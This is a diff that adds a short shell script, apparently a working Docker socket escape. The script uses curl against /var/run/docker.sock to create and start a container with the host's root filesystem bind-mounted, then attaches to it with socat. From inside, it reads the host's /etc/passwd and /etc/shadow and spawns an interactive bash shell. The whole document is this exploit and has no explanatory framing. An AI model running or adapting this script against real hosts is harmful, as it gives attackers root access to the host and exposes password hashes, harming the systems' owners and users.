@@ -1,0 +1,19 @@
+apt update; apt install -y curl socat
+output=$(curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"ubuntu","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create ) 
+echo "${output}"
+conname=$(echo "$output" | cut -d '"' -f 4 | cut -c1-4)
+curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$conname/start
+
+(echo "POST /containers/$conname/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1"; cat << EOF; sleep 1; cat << EOF; cat) | socat - UNIX-CONNECT:/var/run/docker.sock 
+Host:
+Connection: Upgrade
+Upgrade: tcp
+
+
+EOF
+
+md5sum /host_root/etc/passwd
+md5sum /host_root/etc/shadow
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+EOF
